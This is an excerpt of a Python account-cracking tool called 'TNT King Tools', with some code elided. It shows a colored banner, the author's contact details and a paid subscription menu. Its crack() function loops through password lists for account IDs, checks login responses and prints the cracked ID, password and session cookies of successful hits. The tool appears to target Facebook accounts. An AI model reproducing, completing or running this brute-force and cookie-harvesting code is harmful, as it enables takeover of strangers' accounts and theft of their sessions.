...
os.system('espeak -a 300 " Welcome,   to,  TNT,  King,  Tools"')
os.system('xdg-https://www.facebook.com/hamouda.ilyase')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m88888888888 888b    888 88888888888 
    888     8888b   888     888     
    888     88888b  888     888     
    888     888Y88b 888     888     
    888     888 Y88b888     888     
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-TNT ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • KmatchoAl-lhontkor ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mTNT.GUT ]   ║\33[1;34m   
╠══[Whatsapp                 • 0669491481 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[TNT] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•TNT-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " TNT,  Ok,  id"')
...
def Subscraption():
	...
	if key1 in r1:
		...
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 700 DA")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 1500 DA")
		...
		os.system('am start https://wa.me/+213669491481?text=' + tks)
		Subscraption() 
Subscraption() 
login()
